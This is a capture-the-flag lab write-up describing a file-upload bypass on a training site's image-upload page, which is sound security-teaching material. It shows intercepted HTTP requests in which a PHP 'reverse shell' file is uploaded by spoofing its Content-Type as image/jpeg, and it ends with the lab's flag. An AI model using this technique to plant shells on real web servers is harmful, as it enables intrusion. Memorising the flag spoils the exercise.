# File upload bypass
- involves tricking a vulnerable web application into accepting a malicious file by altering its file extension or metadata
- disguising a malicious script as a harmless file can be used to execute a remote shell or modify system settings
- https://book.hacktricks.xyz/pentesting-web/file-upload

<b>keywords</b>: file upload<br>
<b>attacked site</b>: http://borntosec.42/?page=upload

## Exploit
On the image-upload page, we attempt to upload a reverse shell <code>.php</code> script and disguise it with a <code>.php.jpg</code> extension. We intercept the POST request using <code>Burp Suite</code>:
``` http
POST /?page=upload HTTP/1.1
Host: 192.168.56.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------322401855413912123291879912389
Content-Length: 9758
Origin: http://192.168.56.106
Connection: close
Referer: http://192.168.56.106/?page=upload
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1

-----------------------------322401855413912123291879912389
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------322401855413912123291879912389
Content-Disposition: form-data; name="uploaded"; filename="shell.php.jpg"
Content-Type: application/x-php
```
However, this approach fails because the file is not converted server-side. Instead of changing the file extension, we modify the POST data:
``` http
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg
```
This successfully uploads the file, and we are able to access the flag:
``` 
The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## Flag
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
